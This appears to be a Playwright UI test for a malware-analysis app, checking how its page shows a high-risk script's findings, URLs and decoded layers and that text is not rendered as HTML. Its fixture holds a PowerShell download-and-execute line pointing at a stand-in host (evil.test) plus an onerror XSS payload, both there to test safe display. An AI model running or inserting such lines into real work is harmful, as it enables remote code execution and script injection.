// Analise de scripts (83): aviso no topo com risco alto, secao "Script" com
// linguagem, risco, achados (o porque e onde: arquivo ou camada), URLs so como
// texto e camadas decodificadas ("Ver texto" como texto puro); script benigno
// sem aviso.
import { chromium } from 'playwright';

import { createState, entries, ORIGIN, OUT, setupMock, watchErrors } from './mock-api.mjs';

const browser = await chromium.launch();
const context = await browser.newContext({ viewport: { width: 1440, height: 900 } });
// Se algum texto virar HTML, o onerror chamaria alert: marca para a checagem.
await context.addInitScript(() => {
  window.alert = () => {
    window.__alerted = true;
  };
});
const state = createState({ loggedIn: true });

const base = {
  version: 1, analyzedAt: '2026-10-29T10:00:00.000Z', size: 420, bytesAnalyzed: 420,
  detectedType: null, extensionMismatch: null, entropy: 5.2, entropyLevel: 'normal',
  strings: { total: 4, urls: [], ips: [], emails: [], paths: [], registry: [], suspicious: ['powershell'] }, pe: null, iocCandidates: [],
};
const inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/stage2.ps1') <img src=x onerror=alert(1)>";
entries[2].staticInfo = {
  ...base,
  script: {
    language: 'batch',
    lines: 3,
    risk: 'high',
    findings: [
      { name: 'powershell -EncodedCommand', why: 'esconde o comando em Base64', kind: 'obfuscation', layer: 0 },
      { name: '-WindowStyle Hidden', why: 'roda com a janela oculta', kind: 'evasion', layer: 0 },
      { name: 'Invoke-Expression (IEX)', why: 'executa texto como código', kind: 'execute', layer: 1 },
      { name: 'DownloadString/DownloadFile', why: 'baixa conteúdo da internet', kind: 'download', layer: 1 },
    ],
    layers: [{ method: 'PowerShell -EncodedCommand', from: 0, text: inner, truncated: false }],
    urls: ['http://evil.test/stage2.ps1'],
    encoded: false,
  },
};
entries[3].staticInfo = {
  ...base,
  script: { language: 'powershell', lines: 1, risk: 'low', findings: [], layers: [], urls: [], encoded: false },
};
await setupMock(context, state);
const page = await context.newPage();
watchErrors(page);

let failures = 0;
const expect = (label, ok, detail = '') => {
  if (!ok) failures += 1;
  console.log(`${ok ? 'ok  ' : 'FALHA'} ${label}${detail ? ` (${detail})` : ''}`);
};
const messages = async () => (await page.locator('.hpsm-msg__text').allTextContents()).map((t) => t.replace(/\s+/g, ' ').trim());
const section = page.locator('section.hpsm-section:has(.hpsm-section__head:has-text("Script ("))');

// 1. Script malicioso.
await page.goto(ORIGIN + `/entries/${entries[2].id}`, { waitUntil: 'networkidle' });
const warn = (await messages()).find((t) => t.startsWith('Atenção: script'));
expect('aviso no topo', warn === 'Atenção: script Lote (BAT/CMD) com comportamento malicioso (-WindowStyle Hidden: roda com a janela oculta). Não execute fora do ambiente isolado.', warn);
expect('título com a linguagem', (await section.locator('.hpsm-section__head').innerText()).includes('Script (Lote (BAT/CMD))'));
expect('risco alto', (await section.locator('.hpsm-field', { hasText: 'Risco' }).innerText()).includes('Alto'));
const findings = (await section.locator('.dl-doc-alerts li').allInnerTexts()).map((t) => t.replace(/\s+/g, ' ').trim());
expect('achado com o porquê e onde', findings[3] === 'DownloadString/DownloadFile — baixa conteúdo da internet (baixa, na camada 1)', findings.join(' | '));
expect('achado do arquivo', findings[0].endsWith('(ofuscação, no arquivo)'), findings[0]);
const urls = section.locator('.hpsm-field', { hasText: 'URLs (1)' });
expect('URL só como texto', (await urls.innerText()).includes('http://evil.test/stage2.ps1') && (await urls.locator('a').count()) === 0);
const layer = section.locator('.dl-doc-macros li').first();
expect('camada com método e tamanho', (await layer.innerText()).replace(/\s+/g, ' ').includes(`Camada 1 PowerShell -EncodedCommand · no arquivo · ${inner.length} caractere(s)`), await layer.innerText());
await layer.locator('button:has-text("Ver texto")').click();
const code = layer.locator('pre');
expect('texto da camada como texto puro', (await code.innerText()) === inner && (await code.locator('img').count()) === 0);
expect('sem alerta executado', !(await page.evaluate(() => window.__alerted)));
await page.screenshot({ path: `${OUT}/script.png`, fullPage: true });
await layer.locator('button:has-text("Ocultar texto")').click();
expect('ocultar', (await layer.locator('pre').count()) === 0);

// 2. Script benigno.
await page.goto(ORIGIN + `/entries/${entries[3].id}`, { waitUntil: 'networkidle' });
expect('benigno: sem aviso', !(await messages()).some((t) => t.startsWith('Atenção: script')));
expect('benigno: risco baixo e nada suspeito', (await section.innerText()).includes('Baixo') && (await section.innerText()).includes('Nenhuma chamada suspeita encontrada.'));

// 3. Sem script: sem secao.
await page.goto(ORIGIN + `/entries/${entries[0].id}`, { waitUntil: 'networkidle' });
expect('arquivo sem script não tem a seção', (await section.count()) === 0);

await browser.close();
console.log(failures ? `\n${failures} falha(s)` : '\nscript: tudo ok');
process.exit(failures ? 1 : 0);
